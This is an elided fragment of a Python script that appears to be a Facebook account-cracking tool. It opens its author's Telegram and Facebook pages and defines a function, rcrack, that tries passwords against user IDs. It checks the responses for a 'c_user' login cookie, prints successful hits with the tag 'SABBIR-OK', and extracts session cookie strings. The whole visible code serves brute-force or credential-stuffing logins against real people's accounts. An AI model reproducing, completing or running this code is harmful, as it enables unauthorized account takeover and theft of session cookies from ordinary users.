...
def TANJID():
    os.system('clear')
    os.system('xdg-open https://t.me/Sabbir191118')
    print(logo)
...
def main():
    ...
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/Sabbir191118?mibextid=ZbWKwL')
    print(logo)
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[1;33m[SABBIR-OK🥰] {uid} • {ps}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f"\033[1;32m[SABBIR-CP😔] \033[1;31m{uid} • {ps}")
